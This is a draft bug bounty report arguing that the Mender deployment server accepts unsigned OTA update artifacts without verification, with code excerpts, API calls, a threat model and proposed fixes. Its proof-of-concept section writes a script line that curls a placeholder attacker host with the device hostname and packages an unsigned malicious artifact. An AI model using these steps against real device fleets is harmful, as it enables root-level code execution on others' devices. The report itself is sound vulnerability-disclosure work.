# Bug Report Draft: Server-Side Artifact Signature Verification Missing

## Title:
**Mender Server Does Not Enforce Artifact Signature Requirements (Defense-in-Depth Issue)**

---

## Severity: 
**Medium to High** (depending on interpretation)

**Rationale:**
- Per program scope: "Bypassing the signature check for verifying signed artifacts in Mender" is explicitly listed
- This enables attacks on misconfigured clients
- Violates defense-in-depth principle

---

## Summary:

The Mender deployment server accepts and stores unsigned or arbitrarily signed artifacts without any cryptographic verification. While signature verification is documented to occur on the client side, the server has no mechanism to enforce a "signatures required" policy. This creates a security gap where:

1. Attackers with compromised accounts can upload unsigned malicious artifacts
2. Misconfigured clients (without `ArtifactVerifyKey` set) will accept these artifacts
3. The server cannot enforce signature requirements even if desired

---

## Description:

### Current Behavior:

The Mender Server's deployments service (`deployments/app/app.go`) contains the following code:

```go
// Line 980-985
// There is no signature verification here.
// It is just simple check if artifact is signed or not.
aReader.VerifySignatureCallback = func(message, sig []byte) error {
    metaArtifact.Signed = true
    return nil
}
```

**Analysis:**
1. The callback **always returns `nil`** (success)
2. It only records whether a signature is present (`Signed = true`)
3. No cryptographic verification occurs
4. The `Signed` field is never enforced anywhere in the codebase
5. Comment explicitly states: "There is no signature verification here"

### Security Impact:

**Attack Scenario:**
1. Attacker creates account on Mender Server (public signup available)
2. Attacker uploads unsigned artifact containing malicious payload:
   - Artifacts contain executable scripts (`entrypoint.sh`)
   - Scripts run as **root** via systemd
   - Full RCE if deployed to device
3. Attacker creates deployment targeting devices
4. If target device lacks `ArtifactVerifyKey` configuration → accepts unsigned artifact
5. Malicious code executes with root privileges

**Risk Factors:**
- Devices in testing/development may not have signature verification configured
- Human error in production configuration
- Default behavior accepts unsigned artifacts
- No server-side policy to prevent this

---

## Steps to Reproduce:

### 1. Verify Server Accepts Unsigned Artifacts:

```bash
# Login
TOKEN=$(curl -s -X POST https://staging.hosted.mender.io/api/management/v1/useradm/auth/login \
  -H "Authorization: Basic $(echo -n 'EMAIL:PASSWORD' | base64)")

# Check existing artifacts
curl https://staging.hosted.mender.io/api/management/v1/deployments/artifacts \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-HackerOne-Research: <YOUR_USERNAME>"
```

**Result:**
```json
{
  "signed": false,
  "name": "mender-demo-artifact-3.8.3"
}
```

### 2. Verify Code Does Not Check Signatures:

**File**: `github.com/mendersoftware/deployments/app/app.go:980-985`

```go
// There is no signature verification here.
// It is just simple check if artifact is signed or not.
aReader.VerifySignatureCallback = func(message, sig []byte) error {
    metaArtifact.Signed = true
    return nil
}
```

### 3. Confirm No Enforcement:

Search codebase for signature enforcement:
```bash
grep -rn "\.Signed" --include="*.go" | grep -v "test\|mock"
```

**Result:** Field `Signed` is set but never checked.

---

## Expected Behavior:

### Defense-in-Depth Implementation:

The server SHOULD provide options to:

1. **Policy Setting**: Allow administrators to require signed artifacts
2. **Validation**: Reject unsigned artifacts when policy is enabled
3. **Verification**: Optionally verify signature using trusted public keys
4. **Audit**: Log signature verification status for compliance

### Example Implementation:

```go
// Option 1: Policy check
if config.RequireSignedArtifacts && !metaArtifact.Signed {
    return errors.New("unsigned artifacts are not permitted")
}

// Option 2: Actual verification
aReader.VerifySignatureCallback = func(message, sig []byte) error {
    if config.VerifySignatures {
        return cryptoVerify(message, sig, config.PublicKeys)
    }
    metaArtifact.Signed = true
    return nil
}
```

---

## Actual Behavior:

1. Server accepts all artifacts (signed or unsigned)
2. No cryptographic verification performed
3. No policy to enforce signatures
4. `Signed` field is informational only
5. Security entirely delegated to client configuration

---

## Impact Assessment:

### Threat Model:

**Attacker**: User with valid Mender account (free signup)  
**Target**: Devices with misconfigured or missing `ArtifactVerifyKey`  
**Goal**: Remote Code Execution via malicious OTA update

### Attack Vector:

```
1. Attacker uploads unsigned artifact
2. Server stores without verification
3. Deployment created to target devices
4. Client downloads artifact
5. IF client not configured to verify → accepts
6. Malicious scripts execute as root
7. Full device compromise
```

### Likelihood:

- **High** in development/testing environments
- **Medium** in production (depends on configuration diligence)
- **Increases** as fleet size grows (configuration drift)

### Severity:

- **Critical** if client verification commonly misconfigured
- **High** as defense-in-depth failure
- **Medium** if all clients properly configured (unlikely)

---

## Proof of Concept:

### 1. Artifact Structure Analysis:

Mender artifacts contain:
- `scripts/ArtifactInstall_Leave_90_install_systemd_unit`
- Executable scripts that run as root
- `entrypoint.sh` with arbitrary code execution

### 2. Demo Artifact is Unsigned:

```bash
curl https://staging.hosted.mender.io/api/management/v1/deployments/artifacts \
  -H "Authorization: Bearer $TOKEN" | jq '.[] | {name, signed}'
```

**Output:**
```json
{
  "name": "mender-demo-artifact-3.8.3",
  "signed": false
}
```

### 3. Malicious Artifact Creation:

```bash
# Modify entrypoint.sh
echo '#!/bin/sh' > entrypoint.sh
echo 'curl https://attacker.com/pwned?host=$(hostname)' >> entrypoint.sh

# Package as Mender artifact
mender-artifact write rootfs-image \
  -t generic-x86_64 \
  -n malicious-artifact \
  -f payload.tar \
  -o malicious.mender
  # NOTE: No -k flag (no signature)
```

### 4. Server Acceptance:

Upload via API → Server accepts → Deployment created → RCE on vulnerable clients

---

## Mitigation:

### Immediate:

1. Add server-side policy: `REQUIRE_SIGNED_ARTIFACTS=true`
2. Reject unsigned artifacts when policy enabled
3. Document this setting prominently
4. Make it default for production environments

### Long-term:

1. Implement optional server-side signature verification
2. Add audit logging for signature status
3. Alert administrators when unsigned artifacts uploaded
4. Provide migration path for existing unsigned artifacts

---

## References:

1. **Scope**: "Bypassing the signature check for verifying signed artifacts in Mender"
2. **Code**: `github.com/mendersoftware/deployments/app/app.go:980-985`
3. **Docs**: https://docs.mender.io/artifact-creation/sign-and-verify
4. **Security**: https://docs.mender.io/overview/security

---

## Additional Notes:

### Why This Matters:

While the documentation states signature verification occurs on the client, defense-in-depth principles dictate that:

1. Server should not blindly accept potentially malicious artifacts
2. Multiple layers of security are better than one
3. Configuration errors are inevitable - server policy provides backup
4. Compliance requirements may mandate server-side validation

### Comparison to Other Systems:

- **Apple**: Server-side code signing checks
- **Google Play**: APK signature verification on upload
- **Docker**: Registry can enforce image signing policies
- **Mender**: No server-side checks

---

## Questions for Triage:

1. Is the lack of server-side verification intentional?
2. Are there plans to add optional signature enforcement?
3. What percentage of production clients have `ArtifactVerifyKey` configured?
4. Has this been reported before?

---

**Reporter**: [Your HackerOne username]  
**Date**: 2025-11-23  
**Program**: Northern.tech Private Program  
**Asset**: staging.hosted.mender.io  

---

## Estimated Severity:

**Conservative**: Low to Medium ($200-$500)  
**Optimistic**: Medium to High ($500-$1000)  
**Best Case**: Critical if can demonstrate common misconfiguration ($3000)

**Recommendation**: Frame as "Defense-in-Depth" issue rather than "Critical Bypass"
